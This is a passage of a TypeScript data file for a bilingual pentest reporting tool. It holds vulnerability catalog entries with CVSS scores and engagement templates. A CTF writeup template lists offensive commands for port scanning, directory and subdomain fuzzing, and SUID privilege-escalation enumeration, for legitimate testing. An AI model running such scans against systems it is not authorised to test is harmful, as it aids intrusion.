        overview_en: "### Summary\nWebSocket security issues can allow an attacker to gain unauthorized access to a system. This is often the result of a WebSocket that is not properly secured, for example by not using TLS or by not validating the origin of the connection.\n\n---\n\n### Impact\nAn attacker can perform a man-in-the-middle attack and intercept, modify, or inject traffic. It can also lead to cross-site WebSocket hijacking.",
        overview_es: "### Resumen\nLos problemas de seguridad de WebSocket pueden permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un WebSocket que no está debidamente protegido, por ejemplo, al no usar TLS o al no validar el origen de la conexión.\n\n---\n\n### Impacto\nUn atacante puede realizar un ataque de intermediario e interceptar, modificar o inyectar tráfico. También puede conducir al secuestro de WebSocket entre sitios.",
        references: ["https://portswigger.net/web-security/websockets"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-096",
        title_en: "Mobile Root/Jailbreak Detection Bypass",
        title_es: "Omisión de Detección de Root/Jailbreak",
        cwe: "CWE-284",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nA mobile root/jailbreak detection bypass vulnerability allows an attacker to bypass an application's root/jailbreak detection. This is often the result of an application that does not properly detect that it is running on a rooted/jailbroken device.\n\n---\n\n### Impact\nAn attacker can bypass an application's root/jailbreak detection, which can be used to perform further attacks.",
        overview_es: "### Resumen\nUna vulnerabilidad de omisión de detección de root/jailbreak móvil permite a un atacante eludir la detección de root/jailbreak de una aplicación. Esto suele ser el resultado de una aplicación que no detecta correctamente que se está ejecutando en un dispositivo rooteado/con jailbreak.\n\n---\n\n### Impacto\nUn atacante puede eludir la detección de root/jailbreak de una aplicación, lo que se puede utilizar para realizar más ataques.",
        references: ["https://owasp.org/www-project-mobile-security-testing-guide/latest/0x05c-Testing-Platform-Interaction#testing-for-jailbreak-or-root-detection"],
        tags: ["Additional", "Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-097",
        title_en: "Insecure Deep Links",
        title_es: "Enlaces Profundos Inseguros",
        cwe: "CWE-284",
        severity: "Medium",
        cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nAn insecure deep link can allow an attacker to gain unauthorized access to a system. This is often the result of a deep link that is not properly secured, for example by not validating the origin of the connection.\n\n---\n\n### Impact\nAn attacker can perform a variety of attacks, such as cross-site scripting, cache poisoning, and session fixation.",
        overview_es: "### Resumen\nUn enlace profundo inseguro puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un enlace profundo que no está debidamente protegido, por ejemplo, al no validar el origen de la conexión.\n\n---\n\n### Impacto\nUn atacante puede realizar una variedad de ataques, como cross-site scripting, envenenamiento de caché y fijación de sesión.",
        references: ["https://medium.com/exploring-android/the-danger-of-deep-links-34069818826e"],
        tags: ["Additional", "Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-098",
        title_en: "Mobile App Cloning",
        title_es: "Clonación de Aplicaciones Móviles",
        cwe: "CWE-506",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nMobile app cloning is a type of vulnerability that allows an attacker to create a malicious version of a legitimate application. This is often the result of an application that does not properly protect itself from being reverse engineered.\n\n---\n\n### Impact\nAn attacker can create a malicious version of a legitimate application, which can be used to steal sensitive information or to perform unauthorized actions.",
        overview_es: "### Resumen\nLa clonación de aplicaciones móviles es un tipo de vulnerabilidad que permite a un atacante crear una versión maliciosa de una aplicación legítima. Esto suele ser el resultado de una aplicación que no se protege adecuadamente de la ingeniería inversa.\n\n---\n\n### Impacto\nUn atacante puede crear una versión maliciosa de una aplicación legítima, que se puede utilizar para robar información sensible o para realizar acciones no autorizadas.",
        references: ["https://www.guardsquare.com/blog/cloned-apps-the-dark-side-of-app-repackaging"],
        tags: ["Additional", "Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-099",
        title_en: "TCP/IP Vulnerabilities",
        title_es: "Vulnerabilidades TCP/IP",
        cwe: "CWE-1188",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
        overview_en: "### Summary\nTCP/IP vulnerabilities can allow an attacker to gain unauthorized access to a system. This is often the result of a vulnerability in the TCP/IP stack, such as a buffer overflow or a format string vulnerability.\n\n---\n\n### Impact\nAn attacker can perform a variety of attacks, such as denial of service, man-in-the-middle, and remote code execution.",
        overview_es: "### Resumen\nLas vulnerabilidades de TCP/IP pueden permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de una vulnerabilidad en la pila TCP/IP, como un desbordamiento de búfer o una vulnerabilidad de cadena de formato.\n\n---\n\n### Impacto\nUn atacante puede realizar una variedad de ataques, como denegación de servicio, intermediario y ejecución remota de código.",
        references: ["https://www.cisa.gov/uscert/ics/alerts/ics-alert-19-164-01"],
        tags: ["Additional", "Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-100",
        title_en: "Zero-Day Exploits",
        title_es: "Exploits de Día Cero",
        cwe: "CWE-937",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nA zero-day exploit is a type of attack that takes advantage of a vulnerability that has not yet been patched. This can be the result of a vulnerability that has not yet been discovered, or a vulnerability that has been discovered but not yet patched.\n\n---\n\n### Impact\nAn attacker can gain complete control of an affected system.",
        overview_es: "### Resumen\nUn exploit de día cero es un tipo de ataque que aprovecha una vulnerabilidad que aún no ha sido parcheada. Esto puede ser el resultado de una vulnerabilidad que aún no ha sido descubierta, o una vulnerabilidad que ha sido descubierta pero aún no parcheada.\n\n---\n\n### Impacto\nUn atacante puede obtener el control completo de un sistema afectado.",
        references: ["https://www.kaspersky.com/resource-center/definitions/zero-day-exploit"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    }
];

export const projectTemplates: ProjectTemplate[] = [
  {
    id: 'ptpl-1',
    name_en: 'Standard Web App Pentest',
    name_es: 'Pentest Estándar de Aplicación Web',
    description_en: 'A comprehensive security assessment for web applications, covering OWASP Top 10 and other common vulnerabilities.',
    description_es: 'Una evaluación de seguridad completa para aplicaciones web, cubriendo el OWASP Top 10 y otras vulnerabilidades comunes.',
    icon: 'Scan',
    scope_en: `## Scope
- **Application URL:** [TODO: Add application URL, e.g., https://example.com]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Credentials:** [TODO: Specify credentials if provided, e.g., user, admin]
- **Exclusions:** [TODO: Specify any out-of-scope targets, e.g., *.blog.example.com]

## Methodology
The assessment will follow a standard web application penetration testing methodology, including:
1.  **Reconnaissance:** Information gathering about the application and infrastructure.
2.  **Automated Scanning:** Using tools to identify low-hanging fruit.
3.  **Manual Testing:** In-depth testing for complex vulnerabilities such as business logic flaws, access control issues, and injection attacks.
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **URL de la Aplicación:** [TODO: Añadir URL de la aplicación, p.ej., https://ejemplo.com]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Credenciales:** [TODO: Especificar credenciales si se proporcionaron, p.ej., usuario, administrador]
- **Exclusiones:** [TODO: Especificar objetivos fuera de alcance, p.ej., *.blog.ejemplo.com]

## Metodología
La evaluación seguirá una metodología estándar de pruebas de penetración de aplicaciones web, que incluye:
1.  **Reconocimiento:** Recopilación de información sobre la aplicación y la infraestructura.
2.  **Escaneo Automatizado:** Uso de herramientas para identificar vulnerabilidades de bajo esfuerzo.
3.  **Pruebas Manuales:** Pruebas en profundidad para vulnerabilidades complejas como fallos de lógica de negocio, problemas de control de acceso y ataques de inyección.
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
A combination of automated tools and manual techniques were used to perform this assessment.
- **Proxy:** Burp Suite Professional
- **Scanners:** Nessus, Nuclei
- **Reconnaissance:** Amass, Subfinder`,
    appendix_es: `### Apéndice
Se utilizó una combinación de herramientas automatizadas y técnicas manuales para realizar esta evaluación.
- **Proxy:** Burp Suite Professional
- **Escáneres:** Nessus, Nuclei
- **Reconocimiento:** Amass, Subfinder`
  },
  {
    id: 'ptpl-2',
    name_en: 'Internal Network Assessment',
    name_es: 'Evaluación de Red Interna',
    description_en: 'An assessment of the internal network to identify misconfigurations, vulnerable services, and pathways for lateral movement.',
    description_es: 'Una evaluación de la red interna para identificar configuraciones incorrectas, servicios vulnerables y vías para el movimiento lateral.',
    icon: 'Network',
    scope_en: `## Scope
- **IP Ranges:** [TODO: Add IP ranges, e.g., 192.168.1.0/24]
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Assumptions:** The assessment is performed from the perspective of an attacker who has gained a foothold on the internal network (e.g., a compromised workstation).
- **Exclusions:** [TODO: Specify any out-of-scope systems]

## Methodology
1.  **Network Discovery:** Identifying live hosts and open ports.
2.  **Service Enumeration:** Fingerprinting services running on discovered ports.
3.  **Vulnerability Scanning:** Scanning for known vulnerabilities in identified services.
4.  **Manual Exploitation:** Attempting to exploit vulnerabilities to gain further access.
5.  **Active Directory Analysis:** Looking for misconfigurations in Active Directory, such as weak passwords, kerberoasting opportunities, and privilege escalation paths.
6.  **Reporting:** Documenting findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Rangos IP:** [TODO: Añadir rangos IP, p.ej., 192.168.1.0/24]
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** [TODO: Especificar sistemas fuera de alcance]

## Metodología
1.  **Descubrimiento de Red:** Identificación de hosts activos y puertos abiertos.
2.  **Enumeración de Servicios:** Identificación de los servicios que se ejecutan en los puertos descubiertos.
3.  **Escaneo de Vulnerabilidades:** Búsqueda de vulnerabilidades conocidas en los servicios identificados.
4.  **Explotación Manual:** Intento de explotar vulnerabilities para obtener más acceso.
5.  **Análisis de Active Directory:** Búsqueda de configuraciones incorrectas en Active Directory, como contraseñas débiles, oportunidades de kerberoasting y rutas de escalada de privilegios.
6.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap, Masscan
- **Vulnerability Scanner:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Manual Exploitation:** Metasploit Framework, CrackMapExec`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap, Masscan
- **Escáner de Vulnerabilidades:** Nessus
- **Active Directory:** BloodHound, Impacket
- **Explotación Manual:** Metasploit Framework, CrackMapExec`
  },
  {
    id: 'ptpl-3',
    name_en: 'Mobile App Pentest (iOS/Android)',
    name_es: 'Pentest de Aplicación Móvil (iOS/Android)',
    description_en: 'A security assessment of an iOS or Android mobile application, focusing on client-side vulnerabilities and backend API security.',
    description_es: 'Una evaluación de seguridad de una aplicación móvil de iOS o Android, centrada en vulnerabilidades del lado del cliente y seguridad de la API de backend.',
    icon: 'Smartphone',
    scope_en: `## Scope
- **Application:** [TODO: Add application name and package/bundle ID]
- **Platform:** iOS / Android
- **Testing Period:** [TODO Start Date] to [TODO End Date]
- **Backend APIs:** [TODO: List backend API endpoints in scope]

## Methodology
The assessment includes both static and dynamic analysis of the mobile application.
1.  **Static Analysis (SAST):** Analyzing the application binary to find hardcoded secrets, insecure configurations, and other weaknesses without running the code.
2.  **Dynamic Analysis (DAST):** Running the application on a test device (rooted/jailbroken) to analyze its runtime behavior, including:
    -   Network traffic analysis (MitM).
    -   Insecure data storage checks.
    -   IPC endpoint analysis.
    -   Runtime manipulation with Frida.
3.  **API Testing:** Testing the backend APIs for common web vulnerabilities (OWASP API Top 10).
4.  **Reporting:** Documentation of findings and remediation recommendations.`,
    scope_es: `## Alcance
- **Aplicación:** [TODO: Añadir nombre de la aplicación y ID del paquete/bundle]
- **Plataforma:** iOS / Android
- **Periodo de Pruebas:** [TODO Start Date] a [TODO End Date]
- **APIs de Backend:** [TODO: Listar endpoints de API de backend en el alcance]

## Metodología
La evaluación incluye tanto el análisis estático como el dinámico de la aplicación móvil.
1.  **Análisis Estático (SAST):** Análisis del binario de la aplicación para encontrar secretos embebidos, configuraciones inseguras y otras debilidades sin ejecutar el código.
2.  **Análisis Dinámico (DAST):** Ejecución de la aplicación en un dispositivo de prueba (rooteado/con jailbreak) para analizar su comportamiento en tiempo de ejecución, incluyendo:
    -   Análisis del tráfico de red (MitM).
    -   Comprobaciones de almacenamiento de datos inseguro.
    -   Análisis de endpoints IPC.
    -   Manipulación en tiempo de ejecución con Frida.
3.  **Pruebas de API:** Pruebas de las API de backend para vulnerabilidades web comunes (OWASP API Top 10).
4.  **Informe:** Documentación de hallazgos y recomendaciones de remediación.`,
    appendix_en: `### Appendix
- **Static Analysis:** MobSF, jadx
- **Dynamic Analysis:** Burp Suite, Frida, Objection
- **Test Devices:** Google Pixel 6 (Rooted), iPhone 12 (Jailbroken)`,
    appendix_es: `### Apéndice
- **Análisis Estático:** MobSF, jadx
- **Análisis Dinámico:** Burp Suite, Frida, Objection
- **Dispositivos de Prueba:** Google Pixel 6 (Rooteado), iPhone 12 (con Jailbreak)`
  },
  {
    id: 'ptpl-4',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    description_en: 'A generic and professional template for offensive security certification reports (e.g., OSCP, CPTS). Includes all necessary sections for a complete report.',
    description_es: 'Una plantilla genérica y profesional para informes de certificaciones de seguridad ofensiva (p. ej., OSCP, CPTS). Incluye todas las secciones necesarias para un informe completo.',
    icon: 'Award',
    scope_en: `## Introduction
This report documents the results of the simulated penetration test performed in the [TODO: Certification Name] exam environment.

## Objective
The objective was to perform a penetration test, identifying and exploiting vulnerabilities to gain unauthorized access to target systems and achieve the exam objectives.

## Scope
- **Target Network:** [TODO: e.g., 10.10.10.0/24]
- **Exam Duration:** [TODO Start Date] to [TODO End Date]`,
    scope_es: `## Introducción
Este informe documenta los resultados de la prueba de penetración simulada realizada en el entorno del examen [TODO: Nombre de la Certificación].

## Objetivo
El objetivo fue realizar una prueba de penetración, identificando y explotando vulnerabilidades para obtener acceso no autorizado a los sistemas objetivo y cumplir los objetivos del examen.

## Alcance
- **Red Objetivo:** [TODO: p. ej., 10.10.10.0/24]
- **Duración del Examen:** [TODO Start Date] a [TODO End Date]`,
    appendix_en: `### Appendix
| Hostname / IP | Location | Value |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: e.g., /root/proof.txt] | [TODO: Flag Value] |
`,
    appendix_es: `### Apéndice
| Hostname / IP | Ubicación | Valor |
|---|---|---|
| [TODO: Hostname/IP] | [TODO: p. ej., /root/proof.txt] | [TODO: Valor de la Bandera] |
`
  },
  {
    id: 'ptpl-5',
    name_en: 'Machine Writeup',
    name_es: 'Writeup de Máquina',
    description_en: 'A template for documenting the process of solving a CTF machine, such as those on Hack The Box.',
    description_es: 'Una plantilla para documentar el proceso de resolución de una máquina CTF, como las de Hack The Box.',
    icon: 'FileText',
    scope_en: `## General Information
- **Machine Name:** [TODO: Machine Name]
- **IP Address:** [TODO: IP Address]
- **Operating System:** Linux
- **Difficulty:** [TODO: Select Difficulty]
- **Date:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Initial Reconnaissance

### Add IP to /etc/hosts
\`\`\`bash
echo "[TODO: IP Address] [TODO: machine.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Port Scanning (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: IP Address]
\`\`\`

#### Advanced Scan
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: IP Address] -oN targeted
\`\`\`
*Result: Found ports 22 (SSH) and 80 (HTTP) open.*

---

## Web Enumeration

### Initial Access & Analysis
- **URL:** \`http://[TODO: machine.htb]\`
- **Useful Commands:**
  \`\`\`bash
  # Check DNS
  host [TODO: machine.htb]
  dig [TODO: machine.htb]
  
  # Check headers
  curl -I http://[TODO: machine.htb]
  
  # Web technology identification
  whatweb -a3 -v http://[TODO: machine.htb]
  
  # Check common ports
  netcat -vz [TODO: machine.htb] 1-1000
  \`\`\`

### Directory Fuzzing
\`\`\`bash
# Using dirsearch
dirsearch -u http://[TODO: machine.htb] -x 403,404

# Using gobuster
gobuster dir -u http://[TODO: machine.htb] -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://[TODO: machine.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Found directories: [TODO: List found directories like /about.php, /contact.php]*

### Subdomain Enumeration (VHosts)
Check for different response sizes to identify potential virtual hosts.
\`\`\`bash
# Fuzz for subdomains using ffuf and filter by response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: machine.htb]/ -H 'Host: FUZZ.[TODO: machine.htb]' -fs [TODO: base_response_size]
\`\`\`
*Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*

---

## Exploitation

### Vulnerability Research
*Identified Service/Version: [TODO: e.g., Grafana v11.0.0]*
- Searched for exploits on:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Selected Exploit:** [TODO: Describe the selected exploit and its reference URL]

### Exploit Execution
[TODO: Step-by-step description of how the exploit was executed to gain initial access.]

---

## Initial Access
- **User:** \`whoami\` -> [TODO: user]
- **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`

### User Flag
- **Command:** \`cat /home/[TODO: user]/user.txt\`

---

## Privilege Escalation

### Enumeration
- **Check sudo permissions:** \`sudo -l\`
- **Find SUID/GUID files:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Check running services:** \`ss -tuln\`
- **Automated enumeration scripts:** \`linpeas.sh\`, \`pspy\`

### Applied Technique
[TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]

---

## 👑 Root Flag
- **Command:** \`cat /root/root.txt\`
`,
    scope_es: `## Información General
- **Nombre de la máquina:** [TODO: Nombre de la máquina]
- **Dirección IP:** [TODO: Dirección IP]
- **Sistema Operativo:** Linux
- **Dificultad:** [TODO: Seleccionar Dificultad]
- **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "[TODO: Dirección IP] [TODO: maquina.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Escaneo Simple
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
\`\`\`

#### Escaneo Avanzado
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
\`\`\`
*Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*

---

## Enumeración Web

### Acceso y Análisis Inicial
- **URL:** \`http://[TODO: maquina.htb]\`
- **Comandos útiles:**
  \`\`\`bash
  # Comprobar DNS
  host [TODO: maquina.htb]
  dig [TODO: maquina.htb]
  
  # Comprobar cabeceras
  curl -I http://[TODO: maquina.htb]
  
  # Identificación de tecnología web
  whatweb -a3 -v http://[TODO: maquina.htb]
  
  # Comprobar puertos comunes
  netcat -vz [TODO: maquina.htb] 1-1000
  \`\`\`

### Fuzzing de Directorios
\`\`\`bash
# Usando dirsearch
dirsearch -u http://[TODO: maquina.htb] -x 403,404

# Usando gobuster
gobuster dir -u http://[TODO: maquina.htb] -w /usr/share/wordlists/dirb/common.txt

# Usando ffuf
ffuf -u http://[TODO: maquina.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Directorios encontrados: [TODO: Listar directorios como /about.php, /contact.php]*

### Enumeración de Subdominios (VHosts)
Comprobar diferentes tamaños de respuesta para identificar posibles hosts virtuales.
\`\`\`bash
# Fuzzing de subdominios con ffuf y filtrado por tamaño de respuesta
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: maquina.htb]/ -H 'Host: FUZZ.[TODO: maquina.htb]' -fs [TODO: tamaño_respuesta_base]
\`\`\`
*Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*

---

## Explotación

### Investigación de Vulnerabilidades
*Servicio/Versión Identificado: [TODO: p.ej., Grafana v11.0.0]*
- Búsqueda de exploits en:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Exploit Seleccionado:** [TODO: Describir el exploit usado y su URL de referencia]

### Ejecución del Exploit
[TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]

---

## Acceso Inicial
- **Usuario:** \`whoami\` -> [TODO: usuario]
- **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`

### Bandera de Usuario (User Flag)
- **Comando:** \`cat /home/[TODO: usuario]/user.txt\`

---

## Escalada de Privilegios

### Enumeración
- **Comprobar permisos de sudo:** \`sudo -l\`
- **Buscar archivos SUID/GUID:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Ver servicios en ejecución:** \`ss -tuln\`
- **Scripts de enumeración automatizada:** \`linpeas.sh\`, \`pspy\`

### Técnica Aplicada
[TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]

---

## 👑 Root Flag
- **Comando:** \`cat /root/root.txt\`
`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap
- **Web Fuzzer:** ffuf, dirsearch
- **Exploitation:** [TODO: e.g., Metasploit, Python script]
- **Privilege Escalation:** linpeas.sh`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap
- **Fuzzer Web:** ffuf, dirsearch
- **Explotación:** [TODO: p. ej., Metasploit, script de Python]
- **Escalada de Privilegios:** linpeas.sh`
  },
];

  